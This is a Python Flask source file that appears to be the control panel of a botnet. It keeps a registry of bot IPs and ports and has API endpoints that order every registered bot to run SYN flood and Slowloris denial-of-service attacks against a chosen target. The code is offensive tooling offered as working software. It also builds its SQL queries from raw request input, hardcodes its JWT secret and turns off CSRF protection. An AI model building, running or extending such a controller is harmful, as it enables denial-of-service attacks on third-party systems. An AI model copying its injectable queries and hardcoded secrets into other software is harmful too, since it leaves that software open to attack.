from flask import Flask, render_template, request,jsonify, make_response, redirect,url_for
from datetime import datetime, timedelta
from flask_jwt_extended import create_access_token,get_jwt_identity,jwt_required,JWTManager, set_refresh_cookies, set_access_cookies, create_refresh_token, unset_jwt_cookies
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
from werkzeug.security import generate_password_hash, check_password_hash
from module import send_to_bot

app = Flask(__name__)

app.config['JWT_SECRET_KEY'] = 'fd9f74595c05499287de366bcc1068d6'
app.config['JWT_TOKEN_LOCATION'] = ['cookies','headers']
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://root:@localhost/pblrks202'
app.config['JWT_ACCESS_COOKIE_PATH'] = '/api/'
app.config['JWT_REFRESH_COOKIE_PATH'] = '/token/refresh'
app.config["JWT_ACCESS_TOKEN_EXPIRES"] = timedelta(hours=1)
app.config['JWT_COOKIE_CSRF_PROTECT'] = False


jwt = JWTManager(app)
sql = SQLAlchemy(app)
class Users(sql.Model):
    id = sql.Column(sql.Integer, primary_key=True)
    username = sql.Column(sql.String(255), unique=True, nullable=False)
    password = sql.Column(sql.String(255), nullable=False)
    email = sql.Column(sql.String(255), nullable=False)
    def set_password(self, password):
        self.password = generate_password_hash(password)
    def check_password(self, password):
        return check_password_hash(self.password, password)

class Botnet(sql.Model):
    id = sql.Column(sql.Integer, primary_key=True)
    unique_identifier = sql.Column(sql.String(10), nullable=False)
    ip_address = sql.Column(sql.String(15), nullable=False)
    port = sql.Column(sql.Integer(), nullable=False)
    created_at = sql.Column(sql.DateTime(), nullable=False)
    updated_at = sql.Column(sql.DateTime(), nullable=False)
    def set_time (self):
        self.created_at = datetime.now()
        self.updated_at = datetime.now()

@app.errorhandler(404)
def page_not_found(e):
    # note that we set the 404 status explicitly
    return render_template('err/404.html'), 404

@jwt.unauthorized_loader
def unauthorized_callback(callback):
    return redirect(url_for('login'))

@app.route('/auth/login')
def login():
    return render_template('pages/login.html')

@app.route('/auth/register')
def register():
    return render_template('pages/register.html')

@app.route('/')
@jwt_required()
def index():
    return render_template('pages/home.html')

@app.route('/api/auth/register', methods=['POST'])
def registerApi():
    username = request.form['username']
    password = request.form['password']
    email = request.form['email']
    
    # ! USER DUPLICATION CHECK
    check_username = sql.session.execute(text(f'SELECT * FROM users where username="{username}"')).first()
    check_email = sql.session.execute(text(f'SELECT * FROM users where email="{email}"')).first()
    if check_username != None:
        return make_response({'message': 'Username Has Registered !'}, 422)
    if check_email != None:
        return make_response({'message': 'Email Has Registered !'}, 422)
    # ! END USER DUPLICATION CHECK
    
    # ! ADDING USER TO DATABASE
    new_user = Users(username=username, email=email)
    new_user.set_password(password)
    sql.session.add(new_user)
    sql.session.commit()
    # ! END ADDING USER TO DATABASE
    
    data = sql.session.execute(text(f'SELECT * FROM users where username="{username}"')).first()
    return jsonify(
        status=200,
        username=data.username,
        email=data.email
    )

@app.route('/api/botnet/register', methods=['POST'])
def botnetRegisterApi():
    identifier = request.form['identifier']
    ip = request.form['ip']
    port = request.form['port']
    
    # ! IDENTIFIER DUPLICATION CHECK
    check_ip = sql.session.execute(text(f'SELECT * FROM botnet where ip_address="{ip}"')).first()
    check_identifier = sql.session.execute(text(f'SELECT * FROM botnet where unique_identifier="{identifier}"')).first()
    if check_identifier != None:
        return make_response({'message': 'Bot Has Registered !'}, 422)
    if check_ip != None:
        return make_response({'message': 'Bot Has Registered !'}, 422)
    # ! END IDENTIFIER DUPLICATION CHECK
    
    # ! ADDING IDENTIFIER TO DATABASE
    new_bot = Botnet(unique_identifier=identifier, ip_address=ip, port=port)
    new_bot.set_time()
    sql.session.add(new_bot)
    sql.session.commit()
    # ! END ADDING IDENTIFIER TO DATABASE
    
    data = sql.session.execute(text(f'SELECT * FROM botnet where unique_identifier="{identifier}"')).first()
    return jsonify(
        status=200,
        identifier=data.unique_identifier,
        ip=data.ip_address,
        port=port
    )

@app.route('/api/auth/login',methods=['POST'])
def authLogin():
    username = request.form['username']
    password = request.form['password']
    data = Users.query.filter_by(username=username).first()
    if data == None:
        return make_response('Unable to verify', 403, {'WWW-Authenticate': 'Basic realm: "Authentication Failed "'})
    else:
        if data and data.check_password(password):
            
            access_token = create_access_token(identity=username)
            refresh_token = create_refresh_token(identity=username)
            resp = jsonify({'login': True})

            set_access_cookies( resp,access_token)
            set_refresh_cookies(resp, refresh_token)

            return jsonify(access_token = access_token, expiredate=str(datetime.now() + timedelta(seconds=3600)))
        else:
            return make_response('Unable to verify', 403, {'WWW-Authenticate': 'Basic realm: "Authentication Failed "'})

@app.route('/api/auth/logout', methods=['POST'])
def logout():
    res = jsonify({'logout': True})
    unset_jwt_cookies(res)
    return res, 200

@app.route('/api/execute', methods=['POST', 'GET'])
def execute():
    type = request.form['type']
    ip = request.form['ip_port']
    address = ip.split(':')[0]
    port = ip.split(':')[1]
    connect = send_to_bot.Executor(type, address, port)
    ping = connect.ping()
    res = jsonify(ping)
    return res,200

@app.route('/api/botnet/ping', methods=['POST', 'GET'])
def executePing():
    uid = request.form['uid']
    data = sql.session.execute(text(f'SELECT * FROM botnet where unique_identifier = "{uid}"')).first()
    if data == None:
        return jsonify(res='data not found'),404
    address = data[2]
    port = data[3]
    print(address, port)
    connect = send_to_bot.Executor(type)
    ping = connect.ping(port, address)
    res = jsonify(ping)
    return res,200
@app.route('/api/botnet/ping-all', methods=['POST', 'GET'])
def executePingAll():
    ip = request.form['ip_port']
    address = ip.split(':')[0]
    port = ip.split(':')[1]
    connect = send_to_bot.Executor(type)
    ping = connect.ping(address, port)
    res = jsonify(ping)
    return res,200

@app.route('/api/botnet/get', methods=["POST"])
def getBot():
    data = sql.session.execute(text('SELECT * FROM botnet'))
    res = list()
    for i in data:
        jsonres = {'identifier': i.unique_identifier, "ip": i.ip_address, "port": i.port}
        res.append(jsonres)
    print(res)
    return jsonify(res),200

# @app.route('/tes123', methods=['POST'])
# def tess():
#     data = sql.session.execute(text('SELECT * FROM botnet where unique_identifier = "ajodaodawoih"')).first()
#     print(data)
#     return jsonify(identifier=data[1]),200

@app.route('/api/botnet/attack/syn', methods=['POST'])
def attackSyn():
    syn = send_to_bot.Executor('synflood')
    data = sql.session.execute(text('SELECT * FROM botnet'))
    res = list()
    # print(request.form)
    for i in data:
        jsonres = {'identifier': i.unique_identifier, "ip": i.ip_address, "port": i.port}
        res.append(jsonres)
    result = syn.synflood(res, request.form['t_ip'], request.form['t_port'], request.form['t_duration'],request.form['t_thread'])
    # print(res)
    print(result)
    return jsonify(data=result), 200
@app.route('/api/botnet/attack/lor', methods=['POST'])
def attackLor():
    lor = send_to_bot.Executor('slowloris')
    data = sql.session.execute(text('SELECT * FROM botnet'))
    res = list()
    # print(request.form)
    for i in data:
        jsonres = {'identifier': i.unique_identifier, "ip": i.ip_address, "port": i.port}
        res.append(jsonres)
    result = lor.slowloris(res, request.form['t_ip'], request.form['t_port'],request.form['t_socket'], request.form['t_duration'])
    # print(res)
    print(result)
    return jsonify(data=result), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0",debug=True)
    
    